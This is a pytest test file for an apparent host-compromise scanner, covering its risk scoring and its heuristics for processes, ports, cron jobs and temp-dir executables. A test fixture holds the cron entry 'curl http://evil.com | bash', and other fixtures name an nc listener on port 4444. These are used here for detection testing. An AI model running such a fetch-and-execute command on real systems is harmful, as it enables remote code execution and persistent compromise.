import pytest
from app.models.finding import Finding, Evidence
from app.analyzers.scoring import calculate_score
from app.analyzers.heuristics import (
    analyze_processes,
    analyze_network,
    analyze_ssh_keys,
    analyze_cron,
    analyze_files,
)
from app.models.scan_result import ScanResult


def make_finding(severity: str, score: int) -> Finding:
    return Finding(
        id=f"test_{severity}",
        severity=severity,
        category="process",
        title="Test finding",
        evidence=Evidence(command="test"),
        reasoning="test",
        score_contribution=score,
    )


class TestScoring:
    def test_safe_range(self):
        findings = [make_finding("low", 10)]
        summary = calculate_score(findings)
        assert summary.status == "SAFE"
        assert summary.risk_score == 10

    def test_suspicious_range(self):
        findings = [make_finding("medium", 50)]
        summary = calculate_score(findings)
        assert summary.status == "SUSPICIOUS"
        assert summary.risk_score == 50

    def test_compromised_range(self):
        findings = [make_finding("high", 80)]
        summary = calculate_score(findings)
        assert summary.status == "COMPROMISED"

    def test_score_capped_at_100(self):
        findings = [make_finding("critical", 200)]
        summary = calculate_score(findings)
        assert summary.risk_score == 100

    def test_empty_findings(self):
        summary = calculate_score([])
        assert summary.status == "SAFE"
        assert summary.risk_score == 0

    def test_confidence_critical(self):
        findings = [make_finding("critical", 35)]
        summary = calculate_score(findings)
        assert summary.confidence == "high"

    def test_confidence_two_high(self):
        findings = [make_finding("high", 20), make_finding("high", 20)]
        summary = calculate_score(findings)
        assert summary.confidence == "high"

    def test_confidence_no_findings(self):
        summary = calculate_score([])
        assert summary.confidence == "low"


class TestHeuristics:
    def test_process_in_tmp_generates_finding(self):
        result = ScanResult(
            scanner_name="processes",
            parsed_data=[{"user": "root", "pid": "1234", "cpu": "0.1", "mem": "0.1", "command": "/tmp/.evil/agent"}],
        )
        findings = analyze_processes(result)
        assert len(findings) == 1
        assert findings[0].severity == "high"
        assert findings[0].score_contribution == 20

    def test_process_normal_no_finding(self):
        result = ScanResult(
            scanner_name="processes",
            parsed_data=[{"user": "root", "pid": "1", "cpu": "0.0", "mem": "0.0", "command": "/sbin/init"}],
        )
        findings = analyze_processes(result)
        assert findings == []

    def test_unusual_port_generates_finding(self):
        result = ScanResult(
            scanner_name="network",
            parsed_data={"ports": [{"proto": "tcp", "state": "LISTEN", "local_address": "0.0.0.0:4444", "process": "nc"}], "connections": []},
        )
        findings = analyze_network(result)
        assert any(f.id == "net_unusual_port_4444" for f in findings)

    def test_common_port_no_finding(self):
        result = ScanResult(
            scanner_name="network",
            parsed_data={"ports": [{"proto": "tcp", "state": "LISTEN", "local_address": "0.0.0.0:22", "process": "sshd"}], "connections": []},
        )
        findings = analyze_network(result)
        assert findings == []

    def test_suspicious_cron_generates_finding(self):
        result = ScanResult(
            scanner_name="cron",
            parsed_data=[{"source": "crontab -l", "entry": "* * * * * curl http://evil.com | bash"}],
        )
        findings = analyze_cron(result)
        assert len(findings) == 1
        assert findings[0].score_contribution == 20

    def test_executable_in_tmp_generates_finding(self):
        result = ScanResult(
            scanner_name="files",
            parsed_data={"executables_in_tmp": ["/tmp/.x123/agent"], "suspicious_files": [], "recent_system_files": [], "suid_files": []},
        )
        findings = analyze_files(result)
        assert len(findings) == 1
        assert findings[0].severity == "high"

    def test_failed_scanner_returns_no_findings(self):
        result = ScanResult(scanner_name="processes", error="command failed")
        findings = analyze_processes(result)
        assert findings == []
